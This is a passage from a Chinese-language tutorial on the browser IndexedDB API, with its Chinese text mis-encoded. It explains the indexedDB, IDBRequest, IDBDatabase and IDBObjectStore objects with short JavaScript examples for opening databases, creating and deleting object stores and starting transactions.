<h3 id="indexedDB-å¯¹è±¡"><a href="#indexedDB-å¯¹è±¡" class="headerlink" title="indexedDB å¯¹è±¡"></a>indexedDB å¯¹è±¡</h3><p>æµè§ˆå™¨åŸç”Ÿæä¾›<code>indexedDB</code>å¯¹è±¡ï¼Œä½œä¸ºå¼€å‘è€…çš„æ“ä½œæ¥å£ã€‚</p>
<h4 id="indexedDB-open"><a href="#indexedDB-open" class="headerlink" title="indexedDB.open()"></a>indexedDB.open()</h4><p><code>indexedDB.open()</code>æ–¹æ³•ç”¨äºæ‰“å¼€æ•°æ®åº“ã€‚è¿™æ˜¯ä¸€ä¸ªå¼‚æ­¥æ“ä½œï¼Œä½†æ˜¯ä¼šç«‹åˆ»è¿”å›ä¸€ä¸ª IDBOpenDBRequest å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var openRequest &#x3D; window.indexedDB.open(&#39;test&#39;, 1);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç è¡¨ç¤ºï¼Œæ‰“å¼€ä¸€ä¸ªåä¸º<code>test</code>ã€ç‰ˆæœ¬ä¸º<code>1</code>çš„æ•°æ®åº“ã€‚å¦‚æœè¯¥æ•°æ®åº“ä¸å­˜åœ¨ï¼Œåˆ™ä¼šæ–°å»ºè¯¥æ•°æ®åº“ã€‚</p>
<p><code>open()</code>æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ•°æ®åº“åç§°ï¼Œæ ¼å¼ä¸ºå­—ç¬¦ä¸²ï¼Œä¸å¯çœç•¥ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ•°æ®åº“ç‰ˆæœ¬ï¼Œæ˜¯ä¸€ä¸ªå¤§äº<code>0</code>çš„æ­£æ•´æ•°ï¼ˆ<code>0</code>å°†æŠ¥é”™ï¼‰ï¼Œå¦‚æœè¯¥å‚æ•°å¤§äºå½“å‰ç‰ˆæœ¬ï¼Œä¼šè§¦å‘æ•°æ®åº“å‡çº§ã€‚ç¬¬äºŒä¸ªå‚æ•°å¯çœç•¥ï¼Œå¦‚æœæ•°æ®åº“å·²å­˜åœ¨ï¼Œå°†æ‰“å¼€å½“å‰ç‰ˆæœ¬çš„æ•°æ®åº“ï¼›å¦‚æœæ•°æ®åº“ä¸å­˜åœ¨ï¼Œå°†åˆ›å»ºè¯¥ç‰ˆæœ¬çš„æ•°æ®åº“ï¼Œé»˜è®¤ç‰ˆæœ¬ä¸º<code>1</code>ã€‚</p>
<p>æ‰“å¼€æ•°æ®åº“æ˜¯å¼‚æ­¥æ“ä½œï¼Œé€šè¿‡å„ç§äº‹ä»¶é€šçŸ¥å®¢æˆ·ç«¯ã€‚ä¸‹é¢æ˜¯æœ‰å¯èƒ½è§¦å‘çš„4ç§äº‹ä»¶ã€‚</p>
<ul>
<li><strong>success</strong>ï¼šæ‰“å¼€æˆåŠŸã€‚</li>
<li><strong>error</strong>ï¼šæ‰“å¼€å¤±è´¥ã€‚</li>
<li><strong>upgradeneeded</strong>ï¼šç¬¬ä¸€æ¬¡æ‰“å¼€è¯¥æ•°æ®åº“ï¼Œæˆ–è€…æ•°æ®åº“ç‰ˆæœ¬å‘ç”Ÿå˜åŒ–ã€‚</li>
<li><strong>blocked</strong>ï¼šä¸Šä¸€æ¬¡çš„æ•°æ®åº“è¿æ¥è¿˜æœªå…³é—­ã€‚</li>
</ul>
<p>ç¬¬ä¸€æ¬¡æ‰“å¼€æ•°æ®åº“æ—¶ï¼Œä¼šå…ˆè§¦å‘<code>upgradeneeded</code>äº‹ä»¶ï¼Œç„¶åè§¦å‘<code>success</code>äº‹ä»¶ã€‚</p>
<p>æ ¹æ®ä¸åŒçš„éœ€è¦ï¼Œå¯¹ä¸Šé¢4ç§äº‹ä»¶ç›‘å¬å‡½æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var openRequest &#x3D; indexedDB.open(&#39;test&#39;, 1);</span><br><span class="line">var db;</span><br><span class="line"></span><br><span class="line">openRequest.onupgradeneeded &#x3D; function (e) &#123;</span><br><span class="line">  console.log(&#39;Upgrading...&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">openRequest.onsuccess &#x3D; function (e) &#123;</span><br><span class="line">  console.log(&#39;Success!&#39;);</span><br><span class="line">  db &#x3D; openRequest.result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">openRequest.onerror &#x3D; function (e) &#123;</span><br><span class="line">  console.log(&#39;Error&#39;);</span><br><span class="line">  console.log(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç æœ‰ä¸¤ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ã€‚é¦–å…ˆï¼Œ<code>open()</code>æ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ˆIDBOpenDBRequestï¼‰ï¼Œç›‘å¬å‡½æ•°å°±å®šä¹‰åœ¨è¿™ä¸ªå¯¹è±¡ä¸Šé¢ã€‚å…¶æ¬¡ï¼Œ<code>success</code>äº‹ä»¶å‘ç”Ÿåï¼Œä»<code>openRequest.result</code>å±æ€§å¯ä»¥æ‹¿åˆ°å·²ç»æ‰“å¼€çš„<code>IndexedDB</code>æ•°æ®åº“å¯¹è±¡ã€‚</p>
<h4 id="indexedDB-deleteDatabase"><a href="#indexedDB-deleteDatabase" class="headerlink" title="indexedDB.deleteDatabase()"></a>indexedDB.deleteDatabase()</h4><p><code>indexedDB.deleteDatabase()</code>æ–¹æ³•ç”¨äºåˆ é™¤ä¸€ä¸ªæ•°æ®åº“ï¼Œå‚æ•°ä¸ºæ•°æ®åº“çš„åå­—ã€‚å®ƒä¼šç«‹åˆ»è¿”å›ä¸€ä¸ª<code>IDBOpenDBRequest</code>å¯¹è±¡ï¼Œç„¶åå¯¹æ•°æ®åº“æ‰§è¡Œå¼‚æ­¥åˆ é™¤ã€‚åˆ é™¤æ“ä½œçš„ç»“æœä¼šé€šè¿‡äº‹ä»¶é€šçŸ¥ï¼Œ<code>IDBOpenDBRequest</code>å¯¹è±¡å¯ä»¥ç›‘å¬ä»¥ä¸‹äº‹ä»¶ã€‚</p>
<ul>
<li><code>success</code>ï¼šåˆ é™¤æˆåŠŸ</li>
<li><code>error</code>ï¼šåˆ é™¤æŠ¥é”™</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var DBDeleteRequest &#x3D; window.indexedDB.deleteDatabase(&#39;demo&#39;);</span><br><span class="line"></span><br><span class="line">DBDeleteRequest.onerror &#x3D; function (event) &#123;</span><br><span class="line">  console.log(&#39;Error&#39;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DBDeleteRequest.onsuccess &#x3D; function (event) &#123;</span><br><span class="line">  console.log(&#39;success&#39;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨<code>deleteDatabase()</code>æ–¹æ³•ä»¥åï¼Œå½“å‰æ•°æ®åº“çš„å…¶ä»–å·²ç»æ‰“å¼€çš„è¿æ¥éƒ½ä¼šæ¥æ”¶åˆ°<code>versionchange</code>äº‹ä»¶ã€‚</p>
<p>æ³¨æ„ï¼Œåˆ é™¤ä¸å­˜åœ¨çš„æ•°æ®åº“å¹¶ä¸ä¼šæŠ¥é”™ã€‚</p>
<h4 id="indexedDB-cmp"><a href="#indexedDB-cmp" class="headerlink" title="indexedDB.cmp()"></a>indexedDB.cmp()</h4><p><code>indexedDB.cmp()</code>æ–¹æ³•æ¯”è¾ƒä¸¤ä¸ªå€¼æ˜¯å¦ä¸º indexedDB çš„ç›¸åŒçš„ä¸»é”®ã€‚å®ƒè¿”å›ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ¯”è¾ƒçš„ç»“æœï¼š<code>0</code>è¡¨ç¤ºç›¸åŒï¼Œ<code>1</code>è¡¨ç¤ºç¬¬ä¸€ä¸ªä¸»é”®å¤§äºç¬¬äºŒä¸ªä¸»é”®ï¼Œ<code>-1</code>è¡¨ç¤ºç¬¬ä¸€ä¸ªä¸»é”®å°äºç¬¬äºŒä¸ªä¸»é”®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.indexedDB.cmp(1, 2) &#x2F;&#x2F; -1</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œè¿™ä¸ªæ–¹æ³•ä¸èƒ½ç”¨æ¥æ¯”è¾ƒä»»æ„çš„ JavaScript å€¼ã€‚å¦‚æœå‚æ•°æ˜¯å¸ƒå°”å€¼æˆ–å¯¹è±¡ï¼Œå®ƒä¼šæŠ¥é”™ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.indexedDB.cmp(1, true) &#x2F;&#x2F; æŠ¥é”™</span><br><span class="line">window.indexedDB.cmp(&#123;&#125;, &#123;&#125;) &#x2F;&#x2F; æŠ¥é”™</span><br></pre></td></tr></table></figure>

<h3 id="IDBRequest-å¯¹è±¡"><a href="#IDBRequest-å¯¹è±¡" class="headerlink" title="IDBRequest å¯¹è±¡"></a>IDBRequest å¯¹è±¡</h3><p>IDBRequest å¯¹è±¡è¡¨ç¤ºæ‰“å¼€çš„æ•°æ®åº“è¿æ¥ï¼Œ<code>indexedDB.open()</code>æ–¹æ³•å’Œ<code>indexedDB.deleteDatabase()</code>æ–¹æ³•ä¼šè¿”å›è¿™ä¸ªå¯¹è±¡ã€‚æ•°æ®åº“çš„æ“ä½œéƒ½æ˜¯é€šè¿‡è¿™ä¸ªå¯¹è±¡å®Œæˆçš„ã€‚</p>
<p>è¿™ä¸ªå¯¹è±¡çš„æ‰€æœ‰æ“ä½œéƒ½æ˜¯å¼‚æ­¥æ“ä½œï¼Œè¦é€šè¿‡<code>readyState</code>å±æ€§åˆ¤æ–­æ˜¯å¦å®Œæˆï¼Œå¦‚æœä¸º<code>pending</code>å°±è¡¨ç¤ºæ“ä½œæ­£åœ¨è¿›è¡Œï¼Œå¦‚æœä¸º<code>done</code>å°±è¡¨ç¤ºæ“ä½œå®Œæˆï¼Œå¯èƒ½æˆåŠŸä¹Ÿå¯èƒ½å¤±è´¥ã€‚</p>
<p>æ“ä½œå®Œæˆä»¥åï¼Œè§¦å‘<code>success</code>äº‹ä»¶æˆ–<code>error</code>äº‹ä»¶ï¼Œè¿™æ—¶å¯ä»¥é€šè¿‡<code>result</code>å±æ€§å’Œ<code>error</code>å±æ€§æ‹¿åˆ°æ“ä½œç»“æœã€‚å¦‚æœåœ¨<code>pending</code>é˜¶æ®µï¼Œå°±å»è¯»å–è¿™ä¸¤ä¸ªå±æ€§ï¼Œæ˜¯ä¼šæŠ¥é”™çš„ã€‚</p>
<p>IDBRequest å¯¹è±¡æœ‰ä»¥ä¸‹å±æ€§ã€‚</p>
<ul>
<li><code>IDBRequest.readyState</code>ï¼šç­‰äº<code>pending</code>è¡¨ç¤ºæ“ä½œæ­£åœ¨è¿›è¡Œï¼Œç­‰äº<code>done</code>è¡¨ç¤ºæ“ä½œæ­£åœ¨å®Œæˆã€‚</li>
<li><code>IDBRequest.result</code>ï¼šè¿”å›è¯·æ±‚çš„ç»“æœã€‚å¦‚æœè¯·æ±‚å¤±è´¥ã€ç»“æœä¸å¯ç”¨ï¼Œè¯»å–è¯¥å±æ€§ä¼šæŠ¥é”™ã€‚</li>
<li><code>IDBRequest.error</code>ï¼šè¯·æ±‚å¤±è´¥æ—¶ï¼Œè¿”å›é”™è¯¯å¯¹è±¡ã€‚</li>
<li><code>IDBRequest.source</code>ï¼šè¿”å›è¯·æ±‚çš„æ¥æºï¼ˆæ¯”å¦‚ç´¢å¼•å¯¹è±¡æˆ– ObjectStoreï¼‰ã€‚</li>
<li><code>IDBRequest.transaction</code>ï¼šè¿”å›å½“å‰è¯·æ±‚æ­£åœ¨è¿›è¡Œçš„äº‹åŠ¡ï¼Œå¦‚æœä¸åŒ…å«äº‹åŠ¡ï¼Œè¿”å›<code>null</code>ã€‚</li>
<li><code>IDBRequest.onsuccess</code>ï¼šæŒ‡å®š<code>success</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>IDBRequest.onerror</code>ï¼šæŒ‡å®š<code>error</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
</ul>
<p>IDBOpenDBRequest å¯¹è±¡ç»§æ‰¿äº† IDBRequest å¯¹è±¡ï¼Œæä¾›äº†ä¸¤ä¸ªé¢å¤–çš„äº‹ä»¶ç›‘å¬å±æ€§ã€‚</p>
<ul>
<li><code>IDBOpenDBRequest.onblocked</code>ï¼šæŒ‡å®š<code>blocked</code>äº‹ä»¶ï¼ˆ<code>upgradeneeded</code>äº‹ä»¶è§¦å‘æ—¶ï¼Œæ•°æ®åº“ä»ç„¶åœ¨ä½¿ç”¨ï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>IDBOpenDBRequest.onupgradeneeded</code>ï¼š<code>upgradeneeded</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li>
</ul>
<h3 id="IDBDatabase-å¯¹è±¡"><a href="#IDBDatabase-å¯¹è±¡" class="headerlink" title="IDBDatabase å¯¹è±¡"></a>IDBDatabase å¯¹è±¡</h3><p>æ‰“å¼€æ•°æ®æˆåŠŸä»¥åï¼Œå¯ä»¥ä»<code>IDBOpenDBRequest</code>å¯¹è±¡çš„<code>result</code>å±æ€§ä¸Šé¢ï¼Œæ‹¿åˆ°ä¸€ä¸ª<code>IDBDatabase</code>å¯¹è±¡ï¼Œå®ƒè¡¨ç¤ºè¿æ¥çš„æ•°æ®åº“ã€‚åé¢å¯¹æ•°æ®åº“çš„æ“ä½œï¼Œéƒ½é€šè¿‡è¿™ä¸ªå¯¹è±¡å®Œæˆã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var db;</span><br><span class="line">var DBOpenRequest &#x3D; window.indexedDB.open(&#39;demo&#39;, 1);</span><br><span class="line"></span><br><span class="line">DBOpenRequest.onerror &#x3D; function (event) &#123;</span><br><span class="line">  console.log(&#39;Error&#39;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DBOpenRequest.onsuccess &#x3D; function(event) &#123;</span><br><span class="line">  db &#x3D; DBOpenRequest.result;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="å±æ€§-2"><a href="#å±æ€§-2" class="headerlink" title="å±æ€§"></a>å±æ€§</h4><p>IDBDatabase å¯¹è±¡æœ‰ä»¥ä¸‹å±æ€§ã€‚</p>
<ul>
<li><code>IDBDatabase.name</code>ï¼šå­—ç¬¦ä¸²ï¼Œæ•°æ®åº“åç§°ã€‚</li>
<li><code>IDBDatabase.version</code>ï¼šæ•´æ•°ï¼Œæ•°æ®åº“ç‰ˆæœ¬ã€‚æ•°æ®åº“ç¬¬ä¸€æ¬¡åˆ›å»ºæ—¶ï¼Œè¯¥å±æ€§ä¸ºç©ºå­—ç¬¦ä¸²ã€‚</li>
<li><code>IDBDatabase.objectStoreNames</code>ï¼šDOMStringList å¯¹è±¡ï¼ˆå­—ç¬¦ä¸²çš„é›†åˆï¼‰ï¼ŒåŒ…å«å½“å‰æ•°æ®çš„æ‰€æœ‰ object store çš„åå­—ã€‚</li>
<li><code>IDBDatabase.onabort</code>ï¼šæŒ‡å®š abort äº‹ä»¶ï¼ˆäº‹åŠ¡ä¸­æ­¢ï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>IDBDatabase.onclose</code>ï¼šæŒ‡å®š close äº‹ä»¶ï¼ˆæ•°æ®åº“æ„å¤–å…³é—­ï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>IDBDatabase.onerror</code>ï¼šæŒ‡å®š error äº‹ä»¶ï¼ˆè®¿é—®æ•°æ®åº“å¤±è´¥ï¼‰çš„ç›‘å¬å‡½æ•°ã€‚</li>
<li><code>IDBDatabase.onversionchange</code>ï¼šæ•°æ®åº“ç‰ˆæœ¬å˜åŒ–æ—¶è§¦å‘ï¼ˆå‘ç”Ÿ<code>upgradeneeded</code>äº‹ä»¶ï¼Œæˆ–è°ƒç”¨<code>indexedDB.deleteDatabase()</code>ï¼‰ã€‚</li>
</ul>
<p>ä¸‹é¢æ˜¯<code>objectStoreNames</code>å±æ€§çš„ä¾‹å­ã€‚è¯¥å±æ€§è¿”å›ä¸€ä¸ª DOMStringList å¯¹è±¡ï¼ŒåŒ…å«äº†å½“å‰æ•°æ®åº“æ‰€æœ‰å¯¹è±¡ä»“åº“çš„åç§°ï¼ˆå³è¡¨åï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ DOMStringList å¯¹è±¡çš„<code>contains</code>æ–¹æ³•ï¼Œæ£€æŸ¥æ•°æ®åº“æ˜¯å¦åŒ…å«æŸä¸ªå¯¹è±¡ä»“åº“ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (!db.objectStoreNames.contains(&#39;firstOS&#39;)) &#123;</span><br><span class="line">  db.createObjectStore(&#39;firstOS&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç å…ˆåˆ¤æ–­æŸä¸ªå¯¹è±¡ä»“åº“æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨å°±åˆ›å»ºè¯¥å¯¹è±¡ä»“åº“ã€‚</p>
<h4 id="æ–¹æ³•-2"><a href="#æ–¹æ³•-2" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h4><p>IDBDatabase å¯¹è±¡æœ‰ä»¥ä¸‹æ–¹æ³•ã€‚</p>
<ul>
<li><code>IDBDatabase.close()</code>ï¼šå…³é—­æ•°æ®åº“è¿æ¥ï¼Œå®é™…ä¼šç­‰æ‰€æœ‰äº‹åŠ¡å®Œæˆåå†å…³é—­ã€‚</li>
<li><code>IDBDatabase.createObjectStore()</code>ï¼šåˆ›å»ºå­˜æ”¾æ•°æ®çš„å¯¹è±¡ä»“åº“ï¼Œç±»ä¼¼äºä¼ ç»Ÿå…³ç³»å‹æ•°æ®åº“çš„è¡¨æ ¼ï¼Œè¿”å›ä¸€ä¸ª IDBObjectStore å¯¹è±¡ã€‚è¯¥æ–¹æ³•åªèƒ½åœ¨<code>versionchange</code>äº‹ä»¶ç›‘å¬å‡½æ•°ä¸­è°ƒç”¨ã€‚</li>
<li><code>IDBDatabase.deleteObjectStore()</code>ï¼šåˆ é™¤æŒ‡å®šçš„å¯¹è±¡ä»“åº“ã€‚è¯¥æ–¹æ³•åªèƒ½åœ¨<code>versionchange</code>äº‹ä»¶ç›‘å¬å‡½æ•°ä¸­è°ƒç”¨ã€‚</li>
<li><code>IDBDatabase.transaction()</code>ï¼šè¿”å›ä¸€ä¸ª IDBTransaction äº‹åŠ¡å¯¹è±¡ã€‚</li>
</ul>
<p>ä¸‹é¢æ˜¯<code>createObjectStore()</code>æ–¹æ³•çš„ä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var request &#x3D; window.indexedDB.open(&#39;demo&#39;, 2);</span><br><span class="line"></span><br><span class="line">request.onupgradeneeded &#x3D; function (event) &#123;</span><br><span class="line">  var db &#x3D; event.target.result;</span><br><span class="line"></span><br><span class="line">  db.onerror &#x3D; function(event) &#123;</span><br><span class="line">    console.log(&#39;error&#39;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  var objectStore &#x3D; db.createObjectStore(&#39;items&#39;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç åˆ›å»ºäº†ä¸€ä¸ªåä¸º<code>items</code>çš„å¯¹è±¡ä»“åº“ï¼Œå¦‚æœè¯¥å¯¹è±¡ä»“åº“å·²ç»å­˜åœ¨ï¼Œå°±ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ã€‚ä¸ºäº†é¿å…å‡ºé”™ï¼Œéœ€è¦ç”¨åˆ°ä¸‹æ–‡çš„<code>objectStoreNames</code>å±æ€§ï¼Œæ£€æŸ¥å·²æœ‰å“ªäº›å¯¹è±¡ä»“åº“ã€‚</p>
<p><code>createObjectStore()</code>æ–¹æ³•è¿˜å¯ä»¥æ¥å—ç¬¬äºŒä¸ªå¯¹è±¡å‚æ•°ï¼Œç”¨æ¥è®¾ç½®å¯¹è±¡ä»“åº“çš„å±æ€§ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.createObjectStore(&#39;test&#39;, &#123; keyPath: &#39;email&#39; &#125;);</span><br><span class="line">db.createObjectStore(&#39;test2&#39;, &#123; autoIncrement: true &#125;);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>keyPath</code>å±æ€§è¡¨ç¤ºä¸»é”®ï¼ˆç”±äºä¸»é”®çš„å€¼ä¸èƒ½é‡å¤ï¼Œæ‰€ä»¥ä¸Šä¾‹å­˜å…¥ä¹‹å‰ï¼Œå¿…é¡»ä¿è¯æ•°æ®çš„<code>email</code>å±æ€§å€¼éƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼‰ï¼Œé»˜è®¤å€¼ä¸º<code>null</code>ï¼›<code>autoIncrement</code>å±æ€§è¡¨ç¤ºï¼Œæ˜¯å¦ä½¿ç”¨è‡ªåŠ¨é€’å¢çš„æ•´æ•°ä½œä¸ºä¸»é”®ï¼ˆç¬¬ä¸€ä¸ªæ•°æ®è®°å½•ä¸º1ï¼Œç¬¬äºŒä¸ªæ•°æ®è®°å½•ä¸º2ï¼Œä»¥æ­¤ç±»æ¨ï¼‰ï¼Œé»˜è®¤ä¸º<code>false</code>ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œ<code>keyPath</code>å’Œ<code>autoIncrement</code>å±æ€§åªè¦ä½¿ç”¨ä¸€ä¸ªå°±å¤Ÿäº†ï¼Œå¦‚æœä¸¤ä¸ªåŒæ—¶ä½¿ç”¨ï¼Œè¡¨ç¤ºä¸»é”®ä¸ºé€’å¢çš„æ•´æ•°ï¼Œä¸”å¯¹è±¡ä¸å¾—ç¼ºå°‘<code>keyPath</code>æŒ‡å®šçš„å±æ€§ã€‚</p>
<p>ä¸‹é¢æ˜¯<code>deleteObjectStore()</code>æ–¹æ³•çš„ä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var dbName &#x3D; &#39;sampleDB&#39;;</span><br><span class="line">var dbVersion &#x3D; 2;</span><br><span class="line">var request &#x3D; indexedDB.open(dbName, dbVersion);</span><br><span class="line"></span><br><span class="line">request.onupgradeneeded &#x3D; function(e) &#123;</span><br><span class="line">  var db &#x3D; request.result;</span><br><span class="line">  if (e.oldVersion &lt; 1) &#123;</span><br><span class="line">    db.createObjectStore(&#39;store1&#39;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (e.oldVersion &lt; 2) &#123;</span><br><span class="line">    db.deleteObjectStore(&#39;store1&#39;);</span><br><span class="line">    db.createObjectStore(&#39;store2&#39;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æ˜¯<code>transaction()</code>æ–¹æ³•çš„ä¾‹å­ï¼Œè¯¥æ–¹æ³•ç”¨äºåˆ›å»ºä¸€ä¸ªæ•°æ®åº“äº‹åŠ¡ï¼Œè¿”å›ä¸€ä¸ª IDBTransaction å¯¹è±¡ã€‚å‘æ•°æ®åº“æ·»åŠ æ•°æ®ä¹‹å‰ï¼Œå¿…é¡»å…ˆåˆ›å»ºæ•°æ®åº“äº‹åŠ¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var t &#x3D; db.transaction([&#39;items&#39;], &#39;readwrite&#39;);</span><br></pre></td></tr></table></figure>

<p><code>transaction()</code>æ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ï¼šç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‡Œé¢æ˜¯æ‰€æ¶‰åŠçš„å¯¹è±¡ä»“åº“ï¼Œé€šå¸¸æ˜¯åªæœ‰ä¸€ä¸ªï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªè¡¨ç¤ºæ“ä½œç±»å‹çš„å­—ç¬¦ä¸²ã€‚ç›®å‰ï¼Œæ“ä½œç±»å‹åªæœ‰ä¸¤ç§ï¼š<code>readonly</code>ï¼ˆåªè¯»ï¼‰å’Œ<code>readwrite</code>ï¼ˆè¯»å†™ï¼‰ã€‚æ·»åŠ æ•°æ®ä½¿ç”¨<code>readwrite</code>ï¼Œè¯»å–æ•°æ®ä½¿ç”¨<code>readonly</code>ã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œçœç•¥æ—¶é»˜è®¤ä¸º<code>readonly</code>æ¨¡å¼ã€‚</p>
<h3 id="IDBObjectStore-å¯¹è±¡"><a href="#IDBObjectStore-å¯¹è±¡" class="headerlink" title="IDBObjectStore å¯¹è±¡"></a>IDBObjectStore å¯¹è±¡</h3><p>IDBObjectStore å¯¹è±¡å¯¹åº”ä¸€ä¸ªå¯¹è±¡ä»“åº“ï¼ˆobject storeï¼‰ã€‚<code>IDBDatabase.createObjectStore()</code>æ–¹æ³•è¿”å›çš„å°±æ˜¯ä¸€ä¸ª IDBObjectStore å¯¹è±¡ã€‚</p>
<p>IDBDatabase å¯¹è±¡çš„<code>transaction()</code>è¿”å›ä¸€ä¸ªäº‹åŠ¡å¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„<code>objectStore()</code>æ–¹æ³•è¿”å› IDBObjectStore å¯¹è±¡ï¼Œå› æ­¤å¯ä»¥é‡‡ç”¨ä¸‹é¢çš„é“¾å¼å†™æ³•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db.transaction([&#39;test&#39;], &#39;readonly&#39;)</span><br><span class="line">  .objectStore(&#39;test&#39;)</span><br><span class="line">  .get(X)</span><br><span class="line">  .onsuccess &#x3D; function (e) &#123;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="å±æ€§-3"><a href="#å±æ€§-3" class="headerlink" title="å±æ€§"></a>å±æ€§</h4><p>IDBObjectStore å¯¹è±¡æœ‰ä»¥ä¸‹å±æ€§ã€‚</p>
<ul>
<li><code>IDBObjectStore.indexNames</code>ï¼šè¿”å›ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼ˆDOMStringListï¼‰ï¼ŒåŒ…å«äº†å½“å‰å¯¹è±¡ä»“åº“çš„æ‰€æœ‰ç´¢å¼•ã€‚</li>
<li><code>IDBObjectStore.keyPath</code>ï¼šè¿”å›å½“å‰å¯¹è±¡ä»“åº“çš„ä¸»é”®ã€‚</li>
<li><code>IDBObjectStore.name</code>ï¼šè¿”å›å½“å‰å¯¹è±¡ä»“åº“çš„åç§°ã€‚</li>
<li><code>IDBObjectStore.transaction</code>ï¼šè¿”å›å½“å‰å¯¹è±¡ä»“åº“æ‰€å±çš„äº‹åŠ¡å¯¹è±¡ã€‚</li>
